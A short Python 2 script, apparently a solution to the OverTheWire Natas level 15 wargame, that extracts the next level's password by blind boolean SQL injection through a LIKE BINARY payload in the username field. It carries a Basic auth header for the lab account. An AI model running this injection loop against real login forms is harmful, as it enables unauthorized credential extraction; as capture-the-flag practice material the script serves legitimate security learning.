#!/usr/bin/python

import urllib
import urllib2

password = ''
possibleChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345679'
url = "http://natas15.natas.labs.overthewire.org/index.php?debug"

headers = {"Cookie": "__cfduid=d141362f39370db76b28fd4c5fbce84131452708176; __utma=176859643.1765077915.1452708177.1452723092.1452727135.3; __utmc=176859643; __utmz=176859643.1452708177.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)",
           "Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="}

found = True
while found:
    found = False
    for ch in possibleChars:
        data = urllib.urlencode({'username': "natas16\" AND password LIKE BINARY \"%s%s%%\" -- " % (password, ch)})

        request = urllib2.Request(url, headers=headers, data=data)
        res = urllib2.urlopen(request)

        contents = res.read()
        print contents
        if "user exists" in contents:
            password = password + ch
            found = True

print "Password: %s" % password
